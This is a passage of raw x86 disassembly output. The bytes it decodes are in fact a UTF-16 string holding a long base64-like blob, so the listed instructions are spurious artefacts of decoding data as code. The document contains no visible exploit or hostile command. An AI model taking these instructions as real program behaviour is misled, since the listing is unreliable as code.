  40a97a:	74 00                	je     0x40a97c
  40a97c:	67 00 32             	add    %dh,(%bp,%si)
  40a97f:	00 6b 00             	add    %ch,0x0(%ebx)
  40a982:	32 00                	xor    (%eax),%al
  40a984:	54                   	push   %esp
  40a985:	00 38                	add    %bh,(%eax)
  40a987:	00 6b 00             	add    %ch,0x0(%ebx)
  40a98a:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  40a98e:	68 00 6a 00 5a       	push   $0x5a006a00
  40a993:	00 4a 00             	add    %cl,0x0(%edx)
  40a996:	72 00                	jb     0x40a998
  40a998:	4f                   	dec    %edi
  40a999:	00 6e 00             	add    %ch,0x0(%esi)
  40a99c:	76 00                	jbe    0x40a99e
  40a99e:	76 00                	jbe    0x40a9a0
  40a9a0:	68 00 68 00 2b       	push   $0x2b006800
  40a9a5:	00 55 00             	add    %dl,0x0(%ebp)
  40a9a8:	74 00                	je     0x40a9aa
  40a9aa:	79 00                	jns    0x40a9ac
  40a9ac:	52                   	push   %edx
  40a9ad:	00 53 00             	add    %dl,0x0(%ebx)
  40a9b0:	7a 00                	jp     0x40a9b2
  40a9b2:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  40a9b6:	77 00                	ja     0x40a9b8
  40a9b8:	64 00 46 00          	add    %al,%fs:0x0(%esi)
  40a9bc:	37                   	aaa
  40a9bd:	00 58 00             	add    %bl,0x0(%eax)
  40a9c0:	56                   	push   %esi
  40a9c1:	00 47 00             	add    %al,0x0(%edi)
  40a9c4:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  40a9c8:	78 00                	js     0x40a9ca
  40a9ca:	51                   	push   %ecx
  40a9cb:	00 30                	add    %dh,(%eax)
  40a9cd:	00 2b                	add    %ch,(%ebx)
  40a9cf:	00 73 00             	add    %dh,0x0(%ebx)
  40a9d2:	50                   	push   %eax
  40a9d3:	00 58 00             	add    %bl,0x0(%eax)
  40a9d6:	31 00                	xor    %eax,(%eax)
  40a9d8:	4d                   	dec    %ebp
  40a9d9:	00 55 00             	add    %dl,0x0(%ebp)
  40a9dc:	31 00                	xor    %eax,(%eax)
  40a9de:	53                   	push   %ebx
  40a9df:	00 61 00             	add    %ah,0x0(%ecx)
  40a9e2:	38 00                	cmp    %al,(%eax)
  40a9e4:	46                   	inc    %esi
  40a9e5:	00 38                	add    %bh,(%eax)
  40a9e7:	00 4b 00             	add    %cl,0x0(%ebx)
  40a9ea:	32 00                	xor    (%eax),%al
  40a9ec:	33 00                	xor    (%eax),%eax
  40a9ee:	74 00                	je     0x40a9f0
  40a9f0:	51                   	push   %ecx
  40a9f1:	00 6f 00             	add    %ch,0x0(%edi)
  40a9f4:	72 00                	jb     0x40a9f6
  40a9f6:	4d                   	dec    %ebp
  40a9f7:	00 62 00             	add    %ah,0x0(%edx)
  40a9fa:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40a9fe:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9ff:	00 58 00             	add    %bl,0x0(%eax)
  40aa02:	47                   	inc    %edi
  40aa03:	00 46 00             	add    %al,0x0(%esi)
  40aa06:	66 00 4a 00          	data16 add %cl,0x0(%edx)
  40aa0a:	31 00                	xor    %eax,(%eax)
  40aa0c:	53                   	push   %ebx
  40aa0d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa10:	71 00                	jno    0x40aa12
  40aa12:	61                   	popa
  40aa13:	00 6a 00             	add    %ch,0x0(%edx)
  40aa16:	54                   	push   %esp
  40aa17:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  40aa1b:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa1e:	30 00                	xor    %al,(%eax)
  40aa20:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40aa24:	72 00                	jb     0x40aa26
  40aa26:	6b 00 37             	imul   $0x37,(%eax),%eax
  40aa29:	00 53 00             	add    %dl,0x0(%ebx)
  40aa2c:	4b                   	dec    %ebx
  40aa2d:	00 72 00             	add    %dh,0x0(%edx)
  40aa30:	35 00 79 00 70       	xor    $0x70007900,%eax
  40aa35:	00 39                	add    %bh,(%ecx)
  40aa37:	00 47 00             	add    %al,0x0(%edi)
  40aa3a:	70 00                	jo     0x40aa3c
  40aa3c:	39 00                	cmp    %eax,(%eax)
  40aa3e:	53                   	push   %ebx
  40aa3f:	00 71 00             	add    %dh,0x0(%ecx)
  40aa42:	46                   	inc    %esi
  40aa43:	00 56 00             	add    %dl,0x0(%esi)
  40aa46:	37                   	aaa
  40aa47:	00 55 00             	add    %dl,0x0(%ebp)
  40aa4a:	6d                   	insl   (%dx),%es:(%edi)
  40aa4b:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40aa4f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa52:	57                   	push   %edi
  40aa53:	00 42 00             	add    %al,0x0(%edx)
  40aa56:	69 00 30 00 33 00    	imul   $0x330030,(%eax),%eax
  40aa5c:	72 00                	jb     0x40aa5e
  40aa5e:	49                   	dec    %ecx
  40aa5f:	00 58 00             	add    %bl,0x0(%eax)
  40aa62:	68 00 48 00 45       	push   $0x45004800
  40aa67:	00 2f                	add    %ch,(%edi)
  40aa69:	00 51 00             	add    %dl,0x0(%ecx)
  40aa6c:	76 00                	jbe    0x40aa6e
  40aa6e:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40aa72:	6c                   	insb   (%dx),%es:(%edi)
  40aa73:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa76:	38 00                	cmp    %al,(%eax)
  40aa78:	33 00                	xor    (%eax),%eax
  40aa7a:	56                   	push   %esi
  40aa7b:	00 71 00             	add    %dh,0x0(%ecx)
  40aa7e:	71 00                	jno    0x40aa80
  40aa80:	79 00                	jns    0x40aa82
  40aa82:	4e                   	dec    %esi
  40aa83:	00 61 00             	add    %ah,0x0(%ecx)
  40aa86:	34 00                	xor    $0x0,%al
  40aa88:	6d                   	insl   (%dx),%es:(%edi)
  40aa89:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa8c:	43                   	inc    %ebx
  40aa8d:	00 38                	add    %bh,(%eax)
  40aa8f:	00 55 00             	add    %dl,0x0(%ebp)
  40aa92:	43                   	inc    %ebx
  40aa93:	00 62 00             	add    %ah,0x0(%edx)
  40aa96:	45                   	inc    %ebp
  40aa97:	00 35 00 48 00 69    	add    %dh,0x69004800
  40aa9d:	00 2f                	add    %ch,(%edi)
  40aa9f:	00 4f 00             	add    %cl,0x0(%edi)
  40aaa2:	78 00                	js     0x40aaa4
  40aaa4:	76 00                	jbe    0x40aaa6
  40aaa6:	65 00 2b             	add    %ch,%gs:(%ebx)
  40aaa9:	00 75 00             	add    %dh,0x0(%ebp)
  40aaac:	71 00                	jno    0x40aaae
  40aaae:	42                   	inc    %edx
  40aaaf:	00 6d 00             	add    %ch,0x0(%ebp)
  40aab2:	6b 00 30             	imul   $0x30,(%eax),%eax
  40aab5:	00 49 00             	add    %cl,0x0(%ecx)
  40aab8:	46                   	inc    %esi
  40aab9:	00 35 00 4a 00 65    	add    %dh,0x65004a00
  40aabf:	00 45 00             	add    %al,0x0(%ebp)
  40aac2:	50                   	push   %eax
  40aac3:	00 58 00             	add    %bl,0x0(%eax)
  40aac6:	34 00                	xor    $0x0,%al
  40aac8:	30 00                	xor    %al,(%eax)
  40aaca:	52                   	push   %edx
  40aacb:	00 6b 00             	add    %ch,0x0(%ebx)
  40aace:	46                   	inc    %esi
  40aacf:	00 56 00             	add    %dl,0x0(%esi)
  40aad2:	33 00                	xor    (%eax),%eax
  40aad4:	44                   	inc    %esp
  40aad5:	00 62 00             	add    %ah,0x0(%edx)
  40aad8:	30 00                	xor    %al,(%eax)
  40aada:	64 00 37             	add    %dh,%fs:(%edi)
  40aadd:	00 4f 00             	add    %cl,0x0(%edi)
  40aae0:	57                   	push   %edi
  40aae1:	00 78 00             	add    %bh,0x0(%eax)
  40aae4:	36 00 36             	add    %dh,%ss:(%esi)
  40aae7:	00 2b                	add    %ch,(%ebx)
  40aae9:	00 4b 00             	add    %cl,0x0(%ebx)
  40aaec:	4a                   	dec    %edx
  40aaed:	00 52 00             	add    %dl,0x0(%edx)
  40aaf0:	32 00                	xor    (%eax),%al
  40aaf2:	66 00 37             	data16 add %dh,(%edi)
  40aaf5:	00 2b                	add    %ch,(%ebx)
  40aaf7:	00 49 00             	add    %cl,0x0(%ecx)
  40aafa:	38 00                	cmp    %al,(%eax)
  40aafc:	48                   	dec    %eax
  40aafd:	00 65 00             	add    %ah,0x0(%ebp)
  40ab00:	36 00 79 00          	add    %bh,%ss:0x0(%ecx)
  40ab04:	53                   	push   %ebx
  40ab05:	00 4f 00             	add    %cl,0x0(%edi)
  40ab08:	34 00                	xor    $0x0,%al
  40ab0a:	6c                   	insb   (%dx),%es:(%edi)
  40ab0b:	00 38                	add    %bh,(%eax)
  40ab0d:	00 53 00             	add    %dl,0x0(%ebx)
  40ab10:	41                   	inc    %ecx
  40ab11:	00 4e 00             	add    %cl,0x0(%esi)
  40ab14:	2f                   	das
  40ab15:	00 7a 00             	add    %bh,0x0(%edx)
  40ab18:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab19:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40ab1d:	00 31                	add    %dh,(%ecx)
  40ab1f:	00 45 00             	add    %al,0x0(%ebp)
  40ab22:	4c                   	dec    %esp
  40ab23:	00 53 00             	add    %dl,0x0(%ebx)
  40ab26:	2f                   	das
  40ab27:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40ab2b:	00 71 00             	add    %dh,0x0(%ecx)
  40ab2e:	63 00                	arpl   %eax,(%eax)
  40ab30:	72 00                	jb     0x40ab32
  40ab32:	62 00                	bound  %eax,(%eax)
  40ab34:	6a 00                	push   $0x0
  40ab36:	56                   	push   %esi
  40ab37:	00 6e 00             	add    %ch,0x0(%esi)
  40ab3a:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  40ab3e:	52                   	push   %edx
  40ab3f:	00 59 00             	add    %bl,0x0(%ecx)
  40ab42:	51                   	push   %ecx
  40ab43:	00 65 00             	add    %ah,0x0(%ebp)
  40ab46:	74 00                	je     0x40ab48
  40ab48:	4f                   	dec    %edi
  40ab49:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab4c:	4f                   	dec    %edi
  40ab4d:	00 79 00             	add    %bh,0x0(%ecx)
  40ab50:	53                   	push   %ebx
  40ab51:	00 58 00             	add    %bl,0x0(%eax)
  40ab54:	52                   	push   %edx
  40ab55:	00 6f 00             	add    %ch,0x0(%edi)
  40ab58:	5a                   	pop    %edx
  40ab59:	00 41 00             	add    %al,0x0(%ecx)
  40ab5c:	5a                   	pop    %edx
  40ab5d:	00 6d 00             	add    %ch,0x0(%ebp)
  40ab60:	58                   	pop    %eax
  40ab61:	00 79 00             	add    %bh,0x0(%ecx)
  40ab64:	76 00                	jbe    0x40ab66
  40ab66:	78 00                	js     0x40ab68
  40ab68:	39 00                	cmp    %eax,(%eax)
  40ab6a:	44                   	inc    %esp
  40ab6b:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab6e:	55                   	push   %ebp
  40ab6f:	00 52 00             	add    %dl,0x0(%edx)
  40ab72:	55                   	push   %ebp
  40ab73:	00 6d 00             	add    %ch,0x0(%ebp)
  40ab76:	76 00                	jbe    0x40ab78
  40ab78:	6a 00                	push   $0x0
  40ab7a:	53                   	push   %ebx
  40ab7b:	00 47 00             	add    %al,0x0(%edi)
  40ab7e:	59                   	pop    %ecx
  40ab7f:	00 4e 00             	add    %cl,0x0(%esi)
  40ab82:	7a 00                	jp     0x40ab84
  40ab84:	34 00                	xor    $0x0,%al
  40ab86:	6d                   	insl   (%dx),%es:(%edi)
  40ab87:	00 72 00             	add    %dh,0x0(%edx)
  40ab8a:	73 00                	jae    0x40ab8c
  40ab8c:	4e                   	dec    %esi
  40ab8d:	00 52 00             	add    %dl,0x0(%edx)
  40ab90:	2f                   	das
  40ab91:	00 36                	add    %dh,(%esi)
  40ab93:	00 47 00             	add    %al,0x0(%edi)
  40ab96:	31 00                	xor    %eax,(%eax)
  40ab98:	41                   	inc    %ecx
  40ab99:	00 49 00             	add    %cl,0x0(%ecx)
  40ab9c:	70 00                	jo     0x40ab9e
  40ab9e:	6a 00                	push   $0x0
  40aba0:	63 00                	arpl   %eax,(%eax)
  40aba2:	46                   	inc    %esi
  40aba3:	00 43 00             	add    %al,0x0(%ebx)
  40aba6:	77 00                	ja     0x40aba8
  40aba8:	58                   	pop    %eax
  40aba9:	00 73 00             	add    %dh,0x0(%ebx)
  40abac:	50                   	push   %eax
  40abad:	00 69 00             	add    %ch,0x0(%ecx)
  40abb0:	77 00                	ja     0x40abb2
  40abb2:	6c                   	insb   (%dx),%es:(%edi)
  40abb3:	00 6a 00             	add    %ch,0x0(%edx)
  40abb6:	38 00                	cmp    %al,(%eax)
  40abb8:	70 00                	jo     0x40abba
  40abba:	4f                   	dec    %edi
  40abbb:	00 77 00             	add    %dh,0x0(%edi)
  40abbe:	61                   	popa
  40abbf:	00 7a 00             	add    %bh,0x0(%edx)
  40abc2:	31 00                	xor    %eax,(%eax)
  40abc4:	56                   	push   %esi
  40abc5:	00 52 00             	add    %dl,0x0(%edx)
  40abc8:	62 00                	bound  %eax,(%eax)
  40abca:	55                   	push   %ebp
  40abcb:	00 53 00             	add    %dl,0x0(%ebx)
  40abce:	56                   	push   %esi
  40abcf:	00 53 00             	add    %dl,0x0(%ebx)
  40abd2:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40abd6:	47                   	inc    %edi
  40abd7:	00 53 00             	add    %dl,0x0(%ebx)
  40abda:	56                   	push   %esi
  40abdb:	00 39                	add    %bh,(%ecx)
  40abdd:	00 52 00             	add    %dl,0x0(%edx)
  40abe0:	49                   	dec    %ecx
  40abe1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40abe4:	76 00                	jbe    0x40abe6
  40abe6:	56                   	push   %esi
  40abe7:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  40abeb:	00 45 00             	add    %al,0x0(%ebp)
  40abee:	55                   	push   %ebp
  40abef:	00 59 00             	add    %bl,0x0(%ecx)
  40abf2:	42                   	inc    %edx
  40abf3:	00 74 00 57          	add    %dh,0x57(%eax,%eax,1)
  40abf7:	00 55 00             	add    %dl,0x0(%ebp)
  40abfa:	41                   	inc    %ecx
  40abfb:	00 33                	add    %dh,(%ebx)
  40abfd:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  40ac01:	00 72 00             	add    %dh,0x0(%edx)
  40ac04:	46                   	inc    %esi
  40ac05:	00 61 00             	add    %ah,0x0(%ecx)
  40ac08:	73 00                	jae    0x40ac0a
  40ac0a:	33 00                	xor    (%eax),%eax
  40ac0c:	30 00                	xor    %al,(%eax)
  40ac0e:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac0f:	00 70 00             	add    %dh,0x0(%eax)
  40ac12:	38 00                	cmp    %al,(%eax)
  40ac14:	42                   	inc    %edx
  40ac15:	00 59 00             	add    %bl,0x0(%ecx)
  40ac18:	75 00                	jne    0x40ac1a
  40ac1a:	54                   	push   %esp
  40ac1b:	00 58 00             	add    %bl,0x0(%eax)
  40ac1e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac1f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac22:	71 00                	jno    0x40ac24
  40ac24:	30 00                	xor    %al,(%eax)
  40ac26:	2f                   	das
  40ac27:	00 38                	add    %bh,(%eax)
  40ac29:	00 58 00             	add    %bl,0x0(%eax)
  40ac2c:	37                   	aaa
  40ac2d:	00 38                	add    %bh,(%eax)
  40ac2f:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac32:	76 00                	jbe    0x40ac34
  40ac34:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40ac38:	75 00                	jne    0x40ac3a
  40ac3a:	69 00 50 00 53 00    	imul   $0x530050,(%eax),%eax
  40ac40:	4c                   	dec    %esp
  40ac41:	00 31                	add    %dh,(%ecx)
  40ac43:	00 77 00             	add    %dh,0x0(%edi)
  40ac46:	70 00                	jo     0x40ac48
  40ac48:	7a 00                	jp     0x40ac4a
  40ac4a:	39 00                	cmp    %eax,(%eax)
  40ac4c:	32 00                	xor    (%eax),%al
  40ac4e:	38 00                	cmp    %al,(%eax)
  40ac50:	62 00                	bound  %eax,(%eax)
  40ac52:	54                   	push   %esp
  40ac53:	00 31                	add    %dh,(%ecx)
  40ac55:	00 47 00             	add    %al,0x0(%edi)
  40ac58:	75 00                	jne    0x40ac5a
  40ac5a:	7a 00                	jp     0x40ac5c
  40ac5c:	71 00                	jno    0x40ac5e
  40ac5e:	54                   	push   %esp
  40ac5f:	00 4a 00             	add    %cl,0x0(%edx)
  40ac62:	4f                   	dec    %edi
  40ac63:	00 77 00             	add    %dh,0x0(%edi)
  40ac66:	31 00                	xor    %eax,(%eax)
  40ac68:	76 00                	jbe    0x40ac6a
  40ac6a:	7a 00                	jp     0x40ac6c
  40ac6c:	49                   	dec    %ecx
  40ac6d:	00 38                	add    %bh,(%eax)
  40ac6f:	00 4b 00             	add    %cl,0x0(%ebx)
  40ac72:	66 00 37             	data16 add %dh,(%edi)
  40ac75:	00 77 00             	add    %dh,0x0(%edi)
  40ac78:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac79:	00 46 00             	add    %al,0x0(%esi)
  40ac7c:	45                   	inc    %ebp
  40ac7d:	00 32                	add    %dh,(%edx)
  40ac7f:	00 30                	add    %dh,(%eax)
  40ac81:	00 4f 00             	add    %cl,0x0(%edi)
  40ac84:	76 00                	jbe    0x40ac86
  40ac86:	49                   	dec    %ecx
  40ac87:	00 53 00             	add    %dl,0x0(%ebx)
  40ac8a:	61                   	popa
  40ac8b:	00 47 00             	add    %al,0x0(%edi)
  40ac8e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac8f:	00 6e 00             	add    %ch,0x0(%esi)
  40ac92:	54                   	push   %esp
  40ac93:	00 31                	add    %dh,(%ecx)
  40ac95:	00 62 00             	add    %ah,0x0(%edx)
  40ac98:	30 00                	xor    %al,(%eax)
  40ac9a:	50                   	push   %eax
  40ac9b:	00 4c 00 6a          	add    %cl,0x6a(%eax,%eax,1)
  40ac9f:	00 4e 00             	add    %cl,0x0(%esi)
  40aca2:	74 00                	je     0x40aca4
  40aca4:	30 00                	xor    %al,(%eax)
  40aca6:	4b                   	dec    %ebx
  40aca7:	00 61 00             	add    %ah,0x0(%ecx)
  40acaa:	45                   	inc    %ebp
  40acab:	00 78 00             	add    %bh,0x0(%eax)
  40acae:	69 00 7a 00 43 00    	imul   $0x43007a,(%eax),%eax
  40acb4:	46                   	inc    %esi
  40acb5:	00 4d 00             	add    %cl,0x0(%ebp)
  40acb8:	49                   	dec    %ecx
  40acb9:	00 6d 00             	add    %ch,0x0(%ebp)
  40acbc:	32 00                	xor    (%eax),%al
  40acbe:	52                   	push   %edx
  40acbf:	00 72 00             	add    %dh,0x0(%edx)
  40acc2:	74 00                	je     0x40acc4
  40acc4:	61                   	popa
  40acc5:	00 7a 00             	add    %bh,0x0(%edx)
  40acc8:	55                   	push   %ebp
  40acc9:	00 32                	add    %dh,(%edx)
  40accb:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
  40accf:	00 33                	add    %dh,(%ebx)
  40acd1:	00 56 00             	add    %dl,0x0(%esi)
  40acd4:	4a                   	dec    %edx
  40acd5:	00 32                	add    %dh,(%edx)
  40acd7:	00 43 00             	add    %al,0x0(%ebx)
  40acda:	56                   	push   %esi
  40acdb:	00 35 00 75 00 79    	add    %dh,0x79007500
  40ace1:	00 59 00             	add    %bl,0x0(%ecx)
  40ace4:	54                   	push   %esp
  40ace5:	00 63 00             	add    %ah,0x0(%ebx)
  40ace8:	67 00 76 00          	add    %dh,0x0(%bp)
  40acec:	73 00                	jae    0x40acee
  40acee:	6e                   	outsb  %ds:(%esi),(%dx)
  40acef:	00 73 00             	add    %dh,0x0(%ebx)
  40acf2:	53                   	push   %ebx
  40acf3:	00 48 00             	add    %cl,0x0(%eax)
  40acf6:	34 00                	xor    $0x0,%al
  40acf8:	43                   	inc    %ebx
  40acf9:	00 6c 00 33          	add    %ch,0x33(%eax,%eax,1)
  40acfd:	00 47 00             	add    %al,0x0(%edi)
  40ad00:	51                   	push   %ecx
  40ad01:	00 2b                	add    %ch,(%ebx)
  40ad03:	00 49 00             	add    %cl,0x0(%ecx)
  40ad06:	4b                   	dec    %ebx
  40ad07:	00 4b 00             	add    %cl,0x0(%ebx)
  40ad0a:	4e                   	dec    %esi
  40ad0b:	00 37                	add    %dh,(%edi)
  40ad0d:	00 32                	add    %dh,(%edx)
  40ad0f:	00 42 00             	add    %al,0x0(%edx)
  40ad12:	58                   	pop    %eax
  40ad13:	00 70 00             	add    %dh,0x0(%eax)
  40ad16:	4b                   	dec    %ebx
  40ad17:	00 62 00             	add    %ah,0x0(%edx)
  40ad1a:	2f                   	das
  40ad1b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ad1e:	73 00                	jae    0x40ad20
  40ad20:	6b 00 37             	imul   $0x37,(%eax),%eax
  40ad23:	00 44 00 35          	add    %al,0x35(%eax,%eax,1)
  40ad27:	00 68 00             	add    %ch,0x0(%eax)
  40ad2a:	54                   	push   %esp
  40ad2b:	00 67 00             	add    %ah,0x0(%edi)
  40ad2e:	46                   	inc    %esi
  40ad2f:	00 46 00             	add    %al,0x0(%esi)
  40ad32:	47                   	inc    %edi
  40ad33:	00 6f 00             	add    %ch,0x0(%edi)
  40ad36:	69 00 62 00 4f 00    	imul   $0x4f0062,(%eax),%eax
  40ad3c:	44                   	inc    %esp
  40ad3d:	00 77 00             	add    %dh,0x0(%edi)
  40ad40:	54                   	push   %esp
  40ad41:	00 2b                	add    %ch,(%ebx)
  40ad43:	00 38                	add    %bh,(%eax)
  40ad45:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  40ad49:	00 5a 00             	add    %bl,0x0(%edx)
  40ad4c:	33 00                	xor    (%eax),%eax
  40ad4e:	74 00                	je     0x40ad50
  40ad50:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ad54:	46                   	inc    %esi
  40ad55:	00 2b                	add    %ch,(%ebx)
  40ad57:	00 43 00             	add    %al,0x0(%ebx)
  40ad5a:	43                   	inc    %ebx
  40ad5b:	00 48 00             	add    %cl,0x0(%eax)
  40ad5e:	48                   	dec    %eax
  40ad5f:	00 4a 00             	add    %cl,0x0(%edx)
  40ad62:	2b 00                	sub    (%eax),%eax
  40ad64:	7a 00                	jp     0x40ad66
  40ad66:	47                   	inc    %edi
  40ad67:	00 37                	add    %dh,(%edi)
  40ad69:	00 6a 00             	add    %ch,0x0(%edx)
  40ad6c:	74 00                	je     0x40ad6e
  40ad6e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad6f:	00 78 00             	add    %bh,0x0(%eax)
  40ad72:	77 00                	ja     0x40ad74
  40ad74:	75 00                	jne    0x40ad76
  40ad76:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  40ad7a:	32 00                	xor    (%eax),%al
  40ad7c:	2b 00                	sub    (%eax),%eax
  40ad7e:	4e                   	dec    %esi
  40ad7f:	00 7a 00             	add    %bh,0x0(%edx)
  40ad82:	30 00                	xor    %al,(%eax)
  40ad84:	5a                   	pop    %edx
  40ad85:	00 6e 00             	add    %ch,0x0(%esi)
  40ad88:	57                   	push   %edi
  40ad89:	00 75 00             	add    %dh,0x0(%ebp)
  40ad8c:	37                   	aaa
  40ad8d:	00 73 00             	add    %dh,0x0(%ebx)
  40ad90:	57                   	push   %edi
  40ad91:	00 4b 00             	add    %cl,0x0(%ebx)
  40ad94:	51                   	push   %ecx
  40ad95:	00 53 00             	add    %dl,0x0(%ebx)
  40ad98:	59                   	pop    %ecx
  40ad99:	00 41 00             	add    %al,0x0(%ecx)
  40ad9c:	6b 00 79             	imul   $0x79,(%eax),%eax
  40ad9f:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  40ada3:	00 46 00             	add    %al,0x0(%esi)
  40ada6:	37                   	aaa
  40ada7:	00 36                	add    %dh,(%esi)
  40ada9:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40adad:	00 48 00             	add    %cl,0x0(%eax)
  40adb0:	71 00                	jno    0x40adb2
  40adb2:	2f                   	das
  40adb3:	00 6f 00             	add    %ch,0x0(%edi)
  40adb6:	5a                   	pop    %edx
  40adb7:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  40adbb:	00 42 00             	add    %al,0x0(%edx)
  40adbe:	30 00                	xor    %al,(%eax)
  40adc0:	34 00                	xor    $0x0,%al
  40adc2:	74 00                	je     0x40adc4
  40adc4:	78 00                	js     0x40adc6
  40adc6:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  40adca:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40adcd:	00 79 00             	add    %bh,0x0(%ecx)
  40add0:	56                   	push   %esi
  40add1:	00 74 00 44          	add    %dh,0x44(%eax,%eax,1)
  40add5:	00 7a 00             	add    %bh,0x0(%edx)
  40add8:	30 00                	xor    %al,(%eax)
  40adda:	72 00                	jb     0x40addc
  40addc:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  40addf:	00 2f                	add    %ch,(%edi)
  40ade1:	00 2f                	add    %ch,(%edi)
  40ade3:	00 5a 00             	add    %bl,0x0(%edx)
  40ade6:	4c                   	dec    %esp
  40ade7:	00 5a 00             	add    %bl,0x0(%edx)
  40adea:	5a                   	pop    %edx
  40adeb:	00 78 00             	add    %bh,0x0(%eax)
  40adee:	77 00                	ja     0x40adf0
  40adf0:	33 00                	xor    (%eax),%eax
  40adf2:	51                   	push   %ecx
  40adf3:	00 65 00             	add    %ah,0x0(%ebp)
  40adf6:	65 00 37             	add    %dh,%gs:(%edi)
  40adf9:	00 42 00             	add    %al,0x0(%edx)
  40adfc:	74 00                	je     0x40adfe
  40adfe:	70 00                	jo     0x40ae00
  40ae00:	55                   	push   %ebp
  40ae01:	00 6f 00             	add    %ch,0x0(%edi)
  40ae04:	42                   	inc    %edx
  40ae05:	00 7a 00             	add    %bh,0x0(%edx)
  40ae08:	41                   	inc    %ecx
  40ae09:	00 76 00             	add    %dh,0x0(%esi)
  40ae0c:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  40ae10:	52                   	push   %edx
  40ae11:	00 4a 00             	add    %cl,0x0(%edx)
  40ae14:	61                   	popa
  40ae15:	00 70 00             	add    %dh,0x0(%eax)
  40ae18:	46                   	inc    %esi
  40ae19:	00 36                	add    %dh,(%esi)
  40ae1b:	00 4f 00             	add    %cl,0x0(%edi)
  40ae1e:	68 00 67 00 67       	push   $0x67006700
  40ae23:	00 46 00             	add    %al,0x0(%esi)
  40ae26:	6b 00 52             	imul   $0x52,(%eax),%eax
  40ae29:	00 2b                	add    %ch,(%ebx)
  40ae2b:	00 4f 00             	add    %cl,0x0(%edi)
  40ae2e:	72 00                	jb     0x40ae30
  40ae30:	6b 00 58             	imul   $0x58,(%eax),%eax
  40ae33:	00 70 00             	add    %dh,0x0(%eax)
  40ae36:	45                   	inc    %ebp
  40ae37:	00 7a 00             	add    %bh,0x0(%edx)
  40ae3a:	4f                   	dec    %edi
  40ae3b:	00 43 00             	add    %al,0x0(%ebx)
  40ae3e:	74 00                	je     0x40ae40
  40ae40:	46                   	inc    %esi
  40ae41:	00 76 00             	add    %dh,0x0(%esi)
  40ae44:	50                   	push   %eax
  40ae45:	00 48 00             	add    %cl,0x0(%eax)
  40ae48:	30 00                	xor    %al,(%eax)
  40ae4a:	55                   	push   %ebp
  40ae4b:	00 72 00             	add    %dh,0x0(%edx)
  40ae4e:	79 00                	jns    0x40ae50
  40ae50:	73 00                	jae    0x40ae52
  40ae52:	58                   	pop    %eax
  40ae53:	00 2b                	add    %ch,(%ebx)
  40ae55:	00 55 00             	add    %dl,0x0(%ebp)
  40ae58:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae59:	00 6e 00             	add    %ch,0x0(%esi)
  40ae5c:	4e                   	dec    %esi
  40ae5d:	00 78 00             	add    %bh,0x0(%eax)
  40ae60:	48                   	dec    %eax
  40ae61:	00 78 00             	add    %bh,0x0(%eax)
  40ae64:	77 00                	ja     0x40ae66
  40ae66:	33 00                	xor    (%eax),%eax
  40ae68:	6a 00                	push   $0x0
  40ae6a:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40ae6e:	69 00 66 00 46 00    	imul   $0x460066,(%eax),%eax
  40ae74:	38 00                	cmp    %al,(%eax)
  40ae76:	63 00                	arpl   %eax,(%eax)
  40ae78:	55                   	push   %ebp
  40ae79:	00 77 00             	add    %dh,0x0(%edi)
  40ae7c:	34 00                	xor    $0x0,%al
  40ae7e:	45                   	inc    %ebp
  40ae7f:	00 72 00             	add    %dh,0x0(%edx)
  40ae82:	2f                   	das
  40ae83:	00 48 00             	add    %cl,0x0(%eax)
  40ae86:	47                   	inc    %edi
  40ae87:	00 5a 00             	add    %bl,0x0(%edx)
  40ae8a:	57                   	push   %edi
  40ae8b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae8e:	41                   	inc    %ecx
  40ae8f:	00 47 00             	add    %al,0x0(%edi)
  40ae92:	4a                   	dec    %edx
  40ae93:	00 38                	add    %bh,(%eax)
  40ae95:	00 72 00             	add    %dh,0x0(%edx)
  40ae98:	70 00                	jo     0x40ae9a
  40ae9a:	71 00                	jno    0x40ae9c
  40ae9c:	47                   	inc    %edi
  40ae9d:	00 62 00             	add    %ah,0x0(%edx)
  40aea0:	44                   	inc    %esp
  40aea1:	00 65 00             	add    %ah,0x0(%ebp)
  40aea4:	76 00                	jbe    0x40aea6
